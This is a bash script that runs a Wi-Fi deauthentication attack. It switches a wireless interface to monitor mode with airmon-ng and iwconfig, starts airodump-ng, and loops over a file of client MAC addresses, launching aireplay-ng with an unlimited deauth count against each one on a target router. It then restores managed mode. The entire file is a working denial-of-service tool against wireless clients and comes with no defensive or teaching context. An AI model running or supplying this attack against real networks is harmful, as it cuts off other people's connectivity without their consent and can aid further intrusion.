#!/bin/bash

router_mac=$(sudo cat _gateway/BSSID.txt)
interface=$(sudo cat _gateway/IF.txt)
macs="store/txt/file.txt"


sudo ifconfig "$interface" down
sudo airmon-ng check kill
sudo iwconfig "$interface" mode monitor
sudo ifconfig "$interface" up
x-terminal-emulator -e sudo airodump-ng "$interface"
./deauth_2.sh

while read -r val
do
x-terminal-emulator -e sudo aireplay-ng --deauth 0 -a "$router_mac" -c "$val" "$interface"
done < $macs


sudo ifconfig "$interface" down
sudo iwconfig "$interface" mode managed
sudo service NetworkManager restart
